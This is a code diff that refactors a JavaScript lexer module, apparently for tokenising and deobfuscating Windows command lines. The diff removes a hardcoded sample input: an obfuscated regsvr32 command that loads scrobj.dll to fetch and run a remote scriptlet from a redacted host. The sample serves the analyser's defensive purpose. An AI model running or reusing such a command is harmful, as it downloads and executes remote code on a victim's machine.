@@ -1,22 +1,31 @@
 const JisonLex = require("jison-lex"),
       fs       = require("fs");
 
-const grammar = fs.readFileSync(
-    require.resolve("./comspec.l")
-).toString();
+const grammar = fs.readFileSync(require.resolve("./comspec.l")).toString(),
+      lexer   = new JisonLex(grammar);
 
-const lexer = new JisonLex(grammar);
+function tokenise (cmdstr) {
 
-const code = `regsvr32.exe /s /n /u /i:”h”t”t”p://<REDACTED>.jpg scrobj.dll`;
+    lexer.setInput(cmdstr);
 
-lexer.setInput(code);
+    let tokens = [];
 
-while (true) {
-    let token = lexer.lex();
-    console.log(token);
+    while (true) {
+        let token = lexer.lex();
 
-    if (token === "EOF") {
-        break;
+        if (token === "EOF") {
+            break;
+        }
+
+        tokens.push(token);
     }
 
+    return tokens;
 }
+
+function deobfuscate_dos_cmd () {}
+
+module.exports = {
+    tokenise:    tokenise,
+    deobfuscate: deobfuscate_dos_cmd
+};
